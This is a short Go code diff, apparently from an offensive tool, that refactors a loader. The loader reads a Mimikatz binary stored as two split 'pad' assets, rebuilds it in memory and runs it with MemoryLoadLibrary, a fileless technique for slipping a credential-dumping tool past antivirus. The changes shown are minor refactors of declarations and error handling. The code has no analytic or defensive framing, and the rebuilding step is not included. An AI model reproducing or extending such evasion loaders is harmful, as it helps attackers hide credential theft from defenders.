@@ -12,19 +12,13 @@ import (
 	"unsafe"
 )
 
-var (
-	mimikatzPad0 []byte
-	mimikatzPad1 []byte
-	err          error
-)
-
 func main() {
 	// load mimikatz pads
-	mimikatzPad0, err = Asset("mimikatz.exe.0.pad")
+	mimikatzPad0, err := Asset("mimikatz.exe.0.pad")
 	if err != nil {
 		panic(err)
 	}
-	mimikatzPad1, err = Asset("mimikatz.exe.1.pad")
+	mimikatzPad1, err := Asset("mimikatz.exe.1.pad")
 	if err != nil {
 		panic(err)
 	}
@@ -44,8 +38,7 @@ func main() {
 	// load the mimikatz reconstructed binary from memory
 	handle := C.MemoryLoadLibrary(unsafe.Pointer(&mimikatzEXE[0]), &cArgs[0])
 	if handle == nil {
-		print("MemoryLoadLibrary failed")
-		os.Exit(1)
+		panic("MemoryLoadLibrary failed")
 	}
 
 	// run mimikatz
